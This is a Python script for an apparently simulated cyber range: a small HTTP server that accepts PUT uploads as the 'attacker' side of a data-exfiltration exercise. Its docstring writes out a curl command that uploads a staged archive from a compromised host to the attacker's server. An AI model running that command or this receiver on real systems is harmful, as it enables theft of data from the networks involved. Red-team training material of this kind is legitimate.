#!/usr/bin/env python3
"""Exfil receiver for the enterprise-cyber-range (SIMULATED - lab only).

python3 -m http.server only implements GET/HEAD, but scenario phase 6 moves
data attacker-ward with `curl --upload-file` (HTTP PUT). This tiny server
accepts PUT and stores each upload under /tmp/exfil-in/.

Run in the attacker container (port 443 needs root, hence sudo):

    docker exec -d attacker sudo python3 /home/red/exfil-receiver.py 443

Sender side (e.g. from web01 through the allowed egress rule FW-20):

    curl --max-time 30 -T /tmp/staging/exfil.tar.gz http://172.31.100.x:443/exfil.tar.gz
"""
import http.server
import os
import socketserver
import sys

SAVE_DIR = "/tmp/exfil-in"


class PutHandler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        path = self.translate_path(self.path)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        length = int(self.headers.get("Content-Length", 0) or 0)
        received = 0
        with open(path, "wb") as out:
            while received < length:
                chunk = self.rfile.read(min(65536, length - received))
                if not chunk:
                    break
                out.write(chunk)
                received += len(chunk)
        self.send_response(201)
        self.end_headers()
        self.wfile.write(("stored %s (%d bytes)\n" % (self.path, received)).encode())

    def log_message(self, fmt, *args):
        sys.stderr.write("[exfil-receiver] %s - %s\n"
                         % (self.address_string(), fmt % args))


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 443
    os.makedirs(SAVE_DIR, exist_ok=True)
    os.chdir(SAVE_DIR)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer(("0.0.0.0", port), PutHandler) as httpd:
        print("[exfil-receiver] listening on 0.0.0.0:%d; saving PUTs to %s"
              % (port, SAVE_DIR), flush=True)
        httpd.serve_forever()


if __name__ == "__main__":
    main()
